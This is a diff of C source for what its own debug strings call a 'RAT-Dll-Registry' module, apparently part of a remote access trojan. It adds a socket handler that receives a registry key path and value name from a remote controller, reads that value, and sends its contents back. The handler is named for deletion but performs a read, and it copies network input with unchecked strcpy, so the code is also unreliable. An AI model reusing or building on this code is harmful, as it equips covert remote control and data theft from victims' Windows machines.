@@ -214,6 +214,7 @@ cleanup:
 	return status;
 }
 
+
 INT performRegList()
 {
 	INT status = SUCCESS;
@@ -242,8 +243,89 @@ return:
 */
 INT handleRegDelete(__in SOCKET clientSock)
 {
-	INT status = SUCCESS;
+	INT status = SUCCESS, recvBufLen = DEFAULT_BUF_LEN;
+	CHAR recvBuf[DEFAULT_BUF_LEN], msgBuf[DEFAULT_BUF_LEN];
+	CHAR valueBuffer[DEFAULT_BUF_LEN];
+	CHAR keyPathBuffer[DEFAULT_BUF_LEN];
+	void* regValue = NULL;
+	DWORD sizeRegValue = NULL;
 
+	OutputDebugStringA("RAT-Dll-Registry::handleRegDelete - Performing registry delete...\n");
+
+	// Receive the bool for telling whether or not we have a key 
+	status = recv(clientSock, recvBuf, recvBufLen, 0);
+	if (status == SOCKET_ERROR)
+	{
+		sprintf_s(msgBuf, "RAT-Dll-Registry::handleRegDelete - Failed to recv (isKey) %d\n", WSAGetLastError());
+		OutputDebugStringA(msgBuf);
+		goto cleanup; 
+	}
+
+	// Receive our key path 
+	status = recv(clientSock, recvBuf, recvBufLen, 0);
+	if (status == SOCKET_ERROR)
+	{
+		sprintf_s(msgBuf, "RAT-Dll-Registry::handleRegDelete - Failed to recv (key path) %d\n", WSAGetLastError());
+		OutputDebugStringA(msgBuf);
+		goto cleanup; // keep trying to do things until we disconnect or receive a cleanup message
+	}
+
+	// Assign key path to separate buffer 
+	strcpy(keyPathBuffer, recvBuf);
+
+	sprintf_s(msgBuf, "RAT-Dll-Registry::handleRegDelete - Received key path: %s\n", keyPathBuffer);
+	OutputDebugStringA(msgBuf);
+
+	// Get the value name
+	status = recv(clientSock, recvBuf, recvBufLen, 0);
+	if (status == SOCKET_ERROR)
+	{
+		sprintf_s(msgBuf, "RAT-Dll-Registry::handleRegDelete - Failed to recv (value name) %d\n", WSAGetLastError());
+		OutputDebugStringA(msgBuf);
+		goto cleanup;
+	}
+
+	strcpy(valueBuffer, recvBuf);
+
+	sprintf_s(msgBuf, "RAT-Dll-Registry::handleRegDelete - Received key value: %s\n", valueBuffer);
+	OutputDebugStringA(msgBuf);
+
+	sprintf_s(msgBuf, "RAT-Dll-Registry::handleRegDelete - Performing reg read on path %s with key %s...\n", keyPathBuffer, valueBuffer);
+	OutputDebugStringA(msgBuf);
+
+	status = performRegRead(keyPathBuffer, valueBuffer, &regValue, &sizeRegValue);
+	if (status != SUCCESS)
+	{
+		sprintf_s(msgBuf, "RAT-Dll-Registry::handleRegDelete - Failure recevied from performRegRead %d\n", status);
+		OutputDebugStringA(msgBuf);
+		goto cleanup;
+	}
+
+	status = sendSuccess(clientSock);
+	if (status != SUCCESS)
+	{
+		sprintf_s(msgBuf, "RAT-Dll-Registry::handleRegDelete - Failure recevied from sendSuccess %d\n", status);
+		OutputDebugStringA(msgBuf);
+		goto cleanup;
+	}
+
+	// Send back the size of the key value we read 
+	status = send(clientSock, (const char*)&sizeRegValue, sizeof(sizeRegValue), 0);
+	if (status == SOCKET_ERROR)
+	{
+		sprintf_s(msgBuf, "RAT-Dll-Registry::handleRegDelete - Failure recevied from send (sizeRegValue) %d\n", WSAGetLastError());
+		OutputDebugStringA(msgBuf);
+		goto cleanup;
+	}
+
+	// Send back key data we got
+	status = send(clientSock, (const char*)regValue, sizeRegValue, 0);
+	if (status == SOCKET_ERROR)
+	{
+		sprintf_s(msgBuf, "RAT-Dll-Registry::handleRegDelete - Failure recevied from send (regValue) %d\n", WSAGetLastError());
+		OutputDebugStringA(msgBuf);
+		goto cleanup;
+	}
 
 cleanup:
 	return status;
